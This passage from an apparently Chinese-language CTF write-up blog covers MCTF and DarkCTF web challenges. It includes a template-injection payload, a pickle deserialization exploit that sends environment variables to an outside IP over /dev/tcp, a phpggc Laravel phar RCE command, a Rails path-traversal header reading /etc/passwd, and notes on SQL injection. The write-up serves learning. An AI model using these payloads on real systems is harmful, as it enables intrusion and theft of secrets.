class="line">url=<span class="string">'http://web-library.mctf.online/index/'</span></span><br><span class="line">proxies=&#123;<span class="string">'http'</span>:<span class="string">'127.0.0.1:1080'</span>,<span class="string">'https'</span>:<span class="string">'127.0.0.1:1080'</span>&#125;</span><br><span class="line">payload=<span class="string">"""&#123;&#123;request['application']['__globals__']['__builtins__']['__import__']('os')["popen"]("env")["read"]()&#125;&#125;"""</span></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">'X-Forwarded-For'</span>:<span class="string">'123 ,'</span>+payload</span><br><span class="line">&#125;</span><br><span class="line">r=requests.get(url,headers=headers,proxies=proxies)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p><code>FLAG=MCTF{IS_IT_NOT_SO_SECURE_?}</code></p><h3 id="DeadJournal"><a href="#DeadJournal" class="headerlink" title="DeadJournal"></a>DeadJournal</h3><p>åºåˆ—åŒ–åˆ†ç±»çš„pythonåºåˆ—åŒ–</p><p>ç™»å½•ä¼šå‘ç°cookieæ˜¯jwtå½¢å¼çš„ã€‚è€Œå…¶ä¸­payloadçš„ä¸€ä¸ªå€¼identityæ˜æ˜¾æ˜¯pickleåºåˆ—åŒ–åbase64çš„ç»“æœã€‚</p><p>é‚£ä¹ˆéœ€è¦keyæ¥ä¼ªé€ pickleåºåˆ—åŒ–æ•°å€¼è¿›è¡Œrce<br>çˆ†ç ´å¾—åˆ°<code>SecreT</code><br>(æˆ‘ç»å¯¹ä¸ä¼šå†ç”¨åˆ°c-jwt-crackerçˆ†ç ´keyäº†ï¼Œæ•ˆæœå¥‡å·®ã€‚æ‰‹å†™python + rockyou.txt æ•ˆæœå¥½äº†ä¸çŸ¥é“å¤šå°‘å€)</p><p>å› ä¸ºç¦æ­¢äº†os.system ä»¥åŠevalè¿™æ ·çš„å‡½æ•°ã€‚æ‰€ä»¥ç”¨subprocess.checkoutputå³å¯</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span>  b64encode</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        cmd = [<span class="string">'bash'</span>, <span class="string">'-c'</span>, <span class="string">'echo $(env) &gt; /dev/tcp/120.27.246.202/9001 '</span>]</span><br><span class="line">        <span class="keyword">return</span> __import__(<span class="string">'subprocess'</span>).check_output, (cmd,)</span><br><span class="line"></span><br><span class="line">e = exp()</span><br><span class="line">poc = b64encode(pickle.dumps(e)).decode()</span><br><span class="line">token=<span class="string">'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MDE4MTE3NjQsIm5iZiI6MTYwMTgxMTc2NCwianRpIjoiOWU3YzYzOWYtZWVkZC00MzAxLWJkN2EtMmQ4ZDQxYWFjNTA0IiwiZXhwIjoxNjMzMzQ3NzY0LCJpZGVudGl0eSI6ImdBU1ZXZ0VBQUFBQUFBQ01EbkJyYkY5aGNIQXViVzlrWld4emxJd0VWWE5sY3BTVGxDbUJsSDJVS0l3U1gzTmhYMmx1YzNSaGJtTmxYM04wWVhSbGxJd1VjM0ZzWVd4amFHVnRlUzV2Y20wdWMzUmhkR1dVakExSmJuTjBZVzVqWlZOMFlYUmxsSk9VS1lHVWZaUW9qQWhwYm5OMFlXNWpaWlJvQTR3UFkyOXRiV2wwZEdWa1gzTjBZWFJsbEgyVWpBTnJaWG1VYUFKTHFvV1VUb2VVakF4c2IyRmtYMjl3ZEdsdmJuT1VqNVNNQm1Oc1lYTnpYNVJvQW93U1pYaHdhWEpsWkY5aGRIUnlhV0oxZEdWemxJK1VqQWxzYjJGa1gzQmhkR2lVWFpSb0FrNkdsR0dNQjIxaGJtRm5aWEtVakI1emNXeGhiR05vWlcxNUxtOXliUzVwYm5OMGNuVnRaVzUwWVhScGIyNlVqQkZmVTJWeWFXRnNhWHBsVFdGdVlXZGxjcFNUbENtQmxIMlVhQk5vQW5OaWRXS01DSEJoYzNOM2IzSmtsSXdETVRJemxJd0lkWE5sY201aGJXV1VqQWhoWkcxcGJqRXlNNVNNQW1sa2xFdXFkV0l1IiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.VBMiDwfU0EEaEIkq5GMH60THzvCb7QTWPEm-euvTQKs'</span></span><br><span class="line">key=<span class="string">'SecreT'</span></span><br><span class="line">data=jwt.decode(token,verify=<span class="literal">None</span>)</span><br><span class="line">data[<span class="string">'identity'</span>]=poc</span><br><span class="line">token=jwt.encode(data,key=key,algorithm=<span class="string">'HS256'</span>).decode()</span><br><span class="line">print(token)</span><br><span class="line"></span><br><span class="line">r=requests.get(<span class="string">'http://dead-journal.mctf.online/'</span>,cookies=&#123;<span class="string">'access_token_cookie'</span>:token&#125;)</span><br></pre></td></tr></table></figure><p>flagåœ¨ç¯å¢ƒå˜é‡<br><code>FLAG=MCTF{pl33Z_donT_u53_p1cKl13}</code></p><h3 id="2in1"><a href="#2in1" class="headerlink" title="2in1"></a>2in1</h3><p>åºåˆ—åŒ–åˆ†ç±»çš„phpååºåˆ—åŒ–</p><p>æ¯”è¾ƒç¬¦åˆå®æˆ˜çš„é¢˜ç›®ã€‚æœ‰ä¸¤ç§æ–‡ä»¶ä¸Šä¼ æ–¹å¼ã€‚å…¶ä¸­ä¸€ä¸ªæ˜¯ç›´æ¥ä¸Šä¼ ã€‚è¿˜æœ‰ä¸€ç§åº”è¯¥æ˜¯<code>file_get_contents</code>ä¸Šä¼ .è¿™ä¸ªç¯å¢ƒæ˜¯laravelï¼Œè€Œä¸”å¯ä»¥æ¨æµ‹ä¸Šä¼ è·¯å¾„ã€‚åŠ ä¸Šåªæœ‰jpegçš„é™åˆ¶ï¼Œé‚£ä¹ˆå°±èƒ½å¤Ÿä¸Šä¼ pharå¹¶è¿›è¡Œè§¦å‘è¾¾æˆrce.</p><p>phpggcçœŸå¥½ç”¨ã€‚ã€‚ã€‚ç›´æ¥ç”Ÿæˆrceçš„phar-&gt;jpegæ–‡ä»¶ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./phpggc -pj src_public_uploads_test.jpeg  -o  exp.jpeg Laravel/RCE1  system env</span><br></pre></td></tr></table></figure><p>ç„¶å<br><code>phar:///app/public/uploads/YWGXnnP49J.jpeg</code><br>è§¦å‘<br><img src="https://upload-images.jianshu.io/upload_images/18060177-8e25c404f2ce3bf5.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload" data-srcset="https://upload-images.jianshu.io/upload_images/18060177-8e25c404f2ce3bf5.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p><code>flag=mctf{better_than_w@r}</code></p><h3 id="Chat"><a href="#Chat" class="headerlink" title="Chat"></a>Chat</h3><p>åºåˆ—åŒ–åˆ†ç±»çš„javaååºåˆ—åŒ–<br>é¦–å…ˆç»™å‡ºæœåŠ¡ç«¯çš„ä¾èµ–ä»¥åŠä¸€ä¸ªjaråŒ…ã€‚åº”è¯¥æ˜¯jdk11çš„ç¯å¢ƒã€‚ä¸è¿‡åªæ˜¯ä¸€ä¸ªthin client.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dependencies &#123;</span><br><span class="line">    implementation <span class="string">'org.springframework.boot:spring-boot-starter-websocket'</span></span><br><span class="line">    compile group: <span class="string">'com.esotericsoftware'</span>, name: <span class="string">'kryo'</span>, version: <span class="string">'4.0.2'</span></span><br><span class="line">    compile group: <span class="string">'org.apache.xbean'</span>, name: <span class="string">'xbean-naming'</span>, version: <span class="string">'4.17'</span></span><br><span class="line">    compileOnly <span class="string">'org.projectlombok:lombok'</span></span><br><span class="line">    annotationProcessor <span class="string">'org.projectlombok:lombok'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥èµ°åˆ°å…³é”®ç‚¹:æ‰¾writeObject<br><img src="https://upload-images.jianshu.io/upload_images/18060177-f91f23b07a8d3aaa.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload" data-srcset="https://upload-images.jianshu.io/upload_images/18060177-f91f23b07a8d3aaa.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ç„¶åå°±å¤§è‡´å¯ä»¥ç¡®è®¤æ˜¯kyroååºåˆ—åŒ–äº†ã€‚å…·ä½“åˆ©ç”¨æ–¹æ³•ä¸»è¦æ˜¯marshalsec + Xbeanä¾èµ–ç”Ÿæˆä¸€ä¸ªpayloadfile.ç„¶åç”¨ç±»ä¼¼jndiçš„æ–¹æ³•åŠ è½½æ¶æ„classæŠ›å‡ºError.åœ¨errorä¸­ååºåˆ—åŒ–ChatMessageç±»<br>ä¸è¿‡å› ä¸ºæ²¡æœ‰æŒ‡å®šç±»ä»¥åŠä¸€äº›ç»†èŠ‚é—®é¢˜ã€‚è¿˜éœ€è¦é‡æ–°ç¼–è¯‘marshalsec.å…·ä½“å‚è€ƒ<a href="https://gitlab.com/mctf/quals-2020/chat/-/blob/master/exploit/marshalsec.patch" target="_blank" rel="noopener">https://gitlab.com/mctf/quals-2020/chat/-/blob/master/exploit/marshalsec.patch</a>åŠ ä¸Šä¸€ä¸ªå†™æœ‰é™æ€æ–¹æ³•æŠ›å‡ºè¯»æ–‡ä»¶payloadçš„classå³å¯è¾¾æˆrce.</p><p>æ•´ä½“ä¸Šæˆ‘è¿˜æ˜¯æœ‰å¾ˆå¤šé—®é¢˜â€¦â€¦ä¸è¿‡æ—¢ç„¶æºç éƒ½æœ‰äº†çš„è¯ä»¥åæ¥è§¦åˆ°kyroååºåˆ—åŒ–å†å›æ¥å¡«å‘ã€‚</p><h3 id="rails"><a href="#rails" class="headerlink" title="rails"></a>rails</h3><p>ååºåˆ—åŒ–ç±»çš„rubyååºåˆ—åŒ–<br>åŸºæœ¬ä¸Šå°±æ˜¯å¯ä»¥ç”¨è¿™ä¸ªç›´æ¥æ‰“ã€‚<del>ä¸è¿‡å› ä¸ºè¦æ±‚rubyç‰ˆæœ¬2.5.1å°±æ‡’å¾—æ‰“äº†</del>ã€‚åŸºæœ¬æµç¨‹æ˜¯ä¸¤ä¸ªcveæ‰“ç»„åˆæ‹³ã€‚<br>é¦–å…ˆCVE-2019-5418æ˜¯ä¸€ä¸ªè·¯å¾„ç©¿è¶Šçš„æ´ã€‚å¯ä»¥åœ¨headerä¸­è®¾ç½®<code>Accept: ../../../../../../../../etc/passwd</code>ç©¿è¶Šè·¯å¾„è®¿é—®åˆ°æ–‡ä»¶ã€‚<br>ç„¶åå¯ä»¥ä»»æ„è¯»äº†åå°±èƒ½è¯»åˆ°ååºåˆ—åŒ–çš„é…ç½®æ–‡ä»¶credentials.yml.enc ,master.key.è®¡ç®—å‡ºsecret_key_base åå°±èƒ½è®¿é—®æŒ‡å®šèµ„æºè¿›è¡Œååºåˆ—åŒ–rce.CVE-2019-5420<br><a href="https://github.com/mpgn/Rails-doubletap-RCE" target="_blank" rel="noopener">https://github.com/mpgn/Rails-doubletap-RCE</a></p><p>æœ€åè¿˜æ˜¯å†³å®šdockerèµ·äº†ä¸ª2.5.1çš„ç¯å¢ƒâ€¦â€¦ç„¶åç”¨è¿™ä¸ªexpæ—¶å…ˆbundle install (æ¢æº) + å®‰è£…nodejs + å»æ‰exploit.rbé‡Œçš„ä»£ç†å³å¯è¿è¡Œå¹¶åå¼¹shell<br><img src="https://upload-images.jianshu.io/upload_images/18060177-a1bee5391134b092.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload" data-srcset="https://upload-images.jianshu.io/upload_images/18060177-a1bee5391134b092.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p><code>flag:mctf{1_l0ve_rzhd</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DarkCTF-WEB</title>
      <link href="2020/09/25/DarkCTF-WEB/"/>
      <url>2020/09/25/DarkCTF-WEB/</url>
      
        <content type="html"><![CDATA[<p>å¥½ä¹…æ²¡å‘æ–°æ–‡ç« äº†ã€‚æ­£å¥½å›½åº†å°±è¦åˆ°äº†ï¼ŒåŠ ä¸Šè¿˜æœ‰å·…å³°æå®¢è·Ÿå›½èµ›è¦æ‰“ã€‚æ‰€ä»¥å‘¨äº”æ™šä¸Šç»ƒæ‰‹äº†DarkCTFçš„é¢˜ç›®ï¼Œç¨å¾®èŠ±äº†å‡ å°æ—¶akæ‰å½“æ—¶æ”¾å‡ºçš„webã€‚å…¶ä¸­å¤§éƒ¨åˆ†éƒ½æ¯”è¾ƒç®€å•ï¼Œå…¶ä¸­ä¸€é“æ‹¿äº†äºŒè¡€çš„nodejsé¢˜ç›®æœ‰ç‚¹æ„æ€æ‰“ç®—ç¨å¾®è®°å½•ä¸‹ã€‚</p><a id="more"></a><h2 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h2><p>ç»™äº†æºç è·Ÿç½‘é¡µï¼Œä¸»ä½“ä¸Šå°±æ˜¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$web = $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line"><span class="keyword">if</span> (is_numeric($web))&#123;</span><br><span class="line">      <span class="keyword">if</span> (strlen($web) &lt; <span class="number">4</span>)&#123;</span><br><span class="line">          <span class="keyword">if</span> ($web &gt; <span class="number">10000</span>)&#123;</span><br><span class="line">                 <span class="keyword">echo</span> (<span class="string">'&lt;div class="w3-panel w3-green"&gt;&lt;h3&gt;Correct&lt;/h3&gt;</span></span><br><span class="line"><span class="string">  &lt;p&gt;darkCTF&#123;&#125;&lt;/p&gt;&lt;/div&gt;'</span>);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                 <span class="keyword">echo</span> (<span class="string">'&lt;div class="w3-panel w3-red"&gt;&lt;h3&gt;Wrong!&lt;/h3&gt;</span></span><br><span class="line"><span class="string">  &lt;p&gt;Ohhhhh!!! Very Close  &lt;/p&gt;&lt;/div&gt;'</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="keyword">echo</span> (<span class="string">'&lt;div class="w3-panel w3-red"&gt;&lt;h3&gt;Wrong!&lt;/h3&gt;</span></span><br><span class="line"><span class="string">  &lt;p&gt;Nice!!! Near But Far&lt;/p&gt;&lt;/div&gt;'</span>);</span><br><span class="line">      &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="string">'&lt;div class="w3-panel w3-red"&gt;&lt;h3&gt;Wrong!&lt;/h3&gt;</span></span><br><span class="line"><span class="string">  &lt;p&gt;Ahhhhh!!! Try Not Easy&lt;/p&gt;&lt;/div&gt;'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å–UserAgentä½œä¸ºå‚æ•°ï¼Œåˆ¤æ–­äº†å­—ç¬¦ä¸²é•¿åº¦ä¸æ•°å€¼å¤§å°ã€‚ç®€å•ä½¿ç”¨ç§‘å­¦è®¡æ•°æ³•<code>9E9</code>å³å¯ç»•è¿‡</p><h2 id="Apache-Logs"><a href="#Apache-Logs" class="headerlink" title="Apache Logs"></a>Apache Logs</h2><p>ç»™äº†ä¸ªzipç„¶åè®©ä½ ä»é‡Œé¢çš„logæ–‡ä»¶é‡Œæ‰¾flag.ç®€å•æå–å‡ºå…¶ä¸­String.fromCharCodeéƒ¨åˆ†æ”¾åˆ°æµè§ˆå™¨consoleé‡Œè½¬ä¸€ä¸‹å³å¯ã€‚ä¸è¿‡æäº¤æ—¶è¦ç”¨<code>darkCTF</code>è€Œä¸æ˜¯<code>DarkCTF</code></p><h2 id="So-Simple"><a href="#So-Simple" class="headerlink" title="So_Simple"></a>So_Simple</h2><p>å¼€å§‹æ²¡å•¥å¤´ç»ªã€‚åæ¥å‘ç°æç¤ºäº†ä¼ å‚id.äºæ˜¯å¾ˆç®€å•å°±èƒ½å‘ç°æ˜¯ä¸ªsqlæ³¨å…¥ã€‚ç”šè‡³åŸºæœ¬ä¸Šå°±æ˜¯sqli-labsçš„ç¬¬ä¸€å…³ã€‚unionæ³¨å…¥ä»usersè¡¨ä¸­çš„passwordé‡Œæ‰¾åˆ°æŸä¸ªflag.</p><h2 id="Simple-SQL"><a href="#Simple-SQL" class="headerlink" title="Simple_SQL"></a>Simple_SQL</h2><p>ç›´æ¥æç¤ºä¼ å‚id.<br>æ™®é€šå¸ƒå°”ç›²æ³¨ã€‚æ²¡å•¥è¯´çš„ã€‚</p><h2 id="Dusty-Notes"><a href="#Dusty-Notes" class="headerlink" title="Dusty Notes"></a>Dusty Notes</h2><p><img src="/2020/09/25/DarkCTF-WEB/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>è¿™é¢˜èŠ±äº†ä¸€äº›æ—¶é—´ã€‚ä¸è¿‡åšå‡ºæ¥æ—¶æ‹¿äº†äºŒè¡€è¿˜æ˜¯æŒºèˆ’æœçš„ã€‚çœ‹åˆ°Defenitæ˜¯ä¸€è¡€ä¸çŸ¥é“æ˜¯ä¸æ˜¯åˆè¢«posixå¸ˆå‚…ç§’æ‰äº†ã€‚ï¼ˆposix nodejs æ°¸è¿œçš„ç¥ï¼‰</p><p>é¦–å…ˆé¢˜ç›®æ˜¯é»‘ç›’æµ‹è¯•çš„ã€‚è¿™ç‚¹å¯¹äºä¸€ä¸ªnodejsé¢˜ç›®æ¥è¯´å¢åŠ äº†ä¸å°‘éš¾åº¦ã€‚å¦‚æœæ˜¯æˆ‘å‡ºè¿™é¢˜å¯èƒ½å°±ç›´æ¥ç»™æºç äº†ã€‚ä½†æ˜¯åšå®Œåæˆ‘æ„Ÿè§‰è¿™ç§è®¾è®¡è¿˜æ˜¯å¾ˆè´´è¿‘ç°å®çš„ã€‚ä¹Ÿç»™äº†æˆ‘ä¸€å®šç¨‹åº¦ä¸Šé»‘ç›’æµ‹nodejsçš„æ‰‹æ®µã€‚</p><p>é¦–å…ˆé¢˜ç›®å¤§è‡´å®ç°äº†ä¸€ä¸ªnoteåŠŸèƒ½ã€‚å¯ä»¥é€šè¿‡<code>addNotes</code>è·¯ç”±ä¼ å‚messageã€‚é€šè¿‡<code>deleteNote/{id}</code>æ¥åˆ é™¤note.<br><img src="/2020/09/25/DarkCTF-WEB/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>ä¸è¿‡ç®€å•çœ‹äº†ä¸‹cookieå‘ç°å†…å®¹å¯ä»¥ç”±cookieæ§åˆ¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;note</span><br><span class="line">j:[&#123;&quot;id&quot;:1,&quot;body&quot;:&quot;Hack this&quot;&#125;,&#123;&quot;id&quot;:2,&quot;body&quot;:&quot;1&quot;&#125;]</span><br></pre></td></tr></table></figure><p>åˆ°è¿™ä¸€æ­¥ä¸ºæ­¢æˆ‘æœ‰å‡ ç§æ€è·¯<br>1.nodejsååºåˆ—åŒ–ã€‚<br>2.åŸå‹é“¾æ±¡æŸ“<br>3.ï¼Ÿï¼Ÿï¼Ÿ</p><p>é¦–å…ˆæƒ³åˆ°nodejsååºåˆ—åŒ–æ˜¯å› ä¸ºä»¥å‰NahamconCTFè§£å‡ºçš„ä¸€é“nodeé¢˜ã€‚ä¹Ÿæ˜¯é»‘ç›’ã€‚ç„¶ååªæœ‰20å¤šè§£ã€‚ä½†æ˜¯æˆ‘å½“æ—¶æ˜¯æŠ±ç€è¯•ä¸€è¯•çš„å¿ƒæ€å°è¯•äº†ä¸‹ååºåˆ—åŒ–å±…ç„¶æˆåŠŸæ‹¿åˆ°shell.åæ¥å‘ç°ï¼Œä¹‹æ‰€ä»¥ä¼šæœ‰è¿™ç§æƒ³æ³•å°±æ˜¯å› ä¸º:<br><strong>æ•°æ®ä¸ºjsonä¸²ã€‚æ•°æ®ç”±cookieæ§åˆ¶</strong><br>åºåˆ—åŒ–è¾“å‡ºçš„ç»“æœå°±æ˜¯jsonä¸²,æ‰€ä»¥é»‘ç›’ä¸‹å°è¯•node-serializeæœªå°ä¸å¯ã€‚å½“ç„¶æœ¬é¢˜è‡ªç„¶æ˜¯å¤±è´¥äº†ã€‚å› æ­¤æ–¹æ³•ä¹Ÿä¸å†å¤šè¯´ã€‚</p><p>ç¬¬äºŒç§æƒ³æ³•è‡ªç„¶æ˜¯å› ä¸ºnodejsä¸­æƒ³è¦å‡ºç°åŸå‹é“¾æ±¡æŸ“å®åœ¨æ˜¯å¤ªå®¹æ˜“äº†ã€‚ä¸è¿‡æœ‰ä¸€è¯´ä¸€ä¸€é“ä»¥åŸå‹é“¾æ±¡æŸ“ä¸ºæ¼æ´çš„ctfé¢˜ä½¿ç”¨å…¬å…±é¶æœºæ˜¯éå¸¸ä¸å¦¥çš„ï¼Œå¹¶ä¸”ä¸€èˆ¬æ˜¯ç»™å‡ºæºç è¿›è¡Œæµ‹è¯•ã€‚åŠ ä¸Šæ­¤å¤„å¹¶æ²¡æœ‰ä»€ä¹ˆæ˜¾çœ¼çš„æ¨¡æ¿ä½¿ç”¨æ¯”å¦‚ejsã€‚å› æ­¤æ˜¯åŸå‹é“¾æ±¡æŸ“çš„å¯èƒ½æ€§ä¹Ÿä¸å¤§ã€‚</p><p>æ­¤æ—¶åŸºæœ¬ä¸Šå¸¸è§„çš„æ€è·¯å·²ç»èµ°ä¸é€šäº†ã€‚ä½†æ˜¯æˆ‘ç®€å•fuzzäº†ä¸€ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">addNotes?note[]&#x3D;1</span><br><span class="line">addNotes?note[toString]&#x3D;1</span><br></pre></td></tr></table></figure><p>å‘ç°å®ƒæ˜¯æ²¡æœ‰åšåªèƒ½ä¼ å­—ç¬¦ä¸²çš„é™åˆ¶çš„ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œä¸å¯¹å‚æ•°ç±»å‹åšé™åˆ¶æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ å…¥æ•°ç»„æˆ–å¯¹è±¡ã€‚å› æ­¤åœ¨ä¼ å…¥å¯¹è±¡æ—¶è¿™é‡Œä¼šè§¦å‘æŠ¥é”™ã€‚<br>ç„¶åé‡ç‚¹å°±æ¥äº†ï¼Œè§¦å‘çš„æŠ¥é”™å†…å®¹å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;stack&quot;:&quot;TypeError: Cannot convert object to primitive value\n    at Tap.head (&#x2F;app&#x2F;node_modules&#x2F;dustjs-helpers&#x2F;lib&#x2F;dust-helpers.js:121:25)\n    at Tap.go (&#x2F;app&#x2F;node_modules&#x2F;dustjs-linkedin&#x2F;lib&#x2F;dust.js:812:19)\n    at Chunk.write (&#x2F;app&#x2F;node_modules&#x2F;dustjs-linkedin&#x2F;lib&#x2F;dust.js:556:19)\n    at Chunk.reference (&#x2F;app&#x2F;node_modules&#x2F;dustjs-linkedin&#x2F;lib&#x2F;dust.js:611:19)\n    at body_4 (evalmachine.&lt;anonymous&gt;:1:1634)\n    at Chunk.render (&#x2F;app&#x2F;node_modules&#x2F;dustjs-linkedin&#x2F;lib&#x2F;dust.js:598:12)\n    at Object.tap (&#x2F;app&#x2F;node_modules&#x2F;dustjs-helpers&#x2F;lib&#x2F;dust-helpers.js:123:8)\n    at Object.if (&#x2F;app&#x2F;node_modules&#x2F;dustjs-helpers&#x2F;lib&#x2F;dust-helpers.js:213:27)\n    at Chunk.helper (&#x2F;app&#x2F;node_modules&#x2F;dustjs-linkedin&#x2F;lib&#x2F;dust.js:769:34)\n    at body_1 (evalmachine.&lt;anonymous&gt;:1:972)\n    at Chunk.section (&#x2F;app&#x2F;node_modules&#x2F;dustjs-linkedin&#x2F;lib&#x2F;dust.js:654:21)\n    at body_0 (evalmachine.&lt;anonymous&gt;:1:847)\n    at &#x2F;app&#x2F;node_modules&#x2F;dustjs-linkedin&#x2F;lib&#x2F;dust.js:122:11\n    at processTicksAndRejections (internal&#x2F;process&#x2F;task_queues.js:79:11)&quot;,&quot;message&quot;:&quot;Cannot convert object to primitive value&quot;&#125;</span><br></pre></td></tr></table></figure><p>çˆ†å‡ºäº†å½“å‰è·¯å¾„<code>/app</code>ä»¥åŠä¸€ä¸ªä¾èµ–<code>dustjs-linkedin/lib/dust.js</code><br>(è¿™é‡Œå¤šå˜´ä¸€å¥ï¼Œè¿™é‡Œä¸€å¼€å§‹defenitæ‹¿åˆ°ä¸€è¡€åé•¿è¾¾4ä¸ªå¤šå°æ—¶éƒ½æ²¡æœ‰å…¶ä»–è§£ï¼Œå¹¶ä¸”å½“æ—¶è§¦å‘æŠ¥é”™æ—¶é¢˜ç›®åªä¼šçˆ†500è€Œä¸æ˜¯åƒä¸Šé¢è¿™æ ·æ‰“å°æŠ¥é”™traceback,åæ¥æ”¹äº†é¢˜æ‰æœ‰äº†è¿™ä¸ªæŠ¥é”™æ ˆ)</p><p>çœ‹åˆ°è¿™ä¸ª<code>dust</code>åŠ ä¸Šé¢˜ç›®åä¸­çš„dustï¼Œå»æœç´¢ä¸€æ³¢çš„è¯ä¸éš¾å‘ç°å­˜åœ¨ä¸€ä¸ªæ¼æ´<br>å¹¶ä¸”æœ‰æ–‡ç« åœ¨å®æˆ˜ä¸­é‡åˆ°è§£å†³<br><a href="https://artsploit.blogspot.com/2016/08/pprce2.html" target="_blank" rel="noopener">https://artsploit.blogspot.com/2016/08/pprce2.html</a></p><p>ç®€å•è¯´å°±æ˜¯ï¼Œdustçš„æ¨¡æ¿ä¼šè¿›å…¥ä¸€ä¸ªifè¯­å¥æ‰§è¡Œ<code>eval</code>ã€‚ä½†æ˜¯å¦‚æœæˆ‘ä»¬ç›´æ¥ä¼ 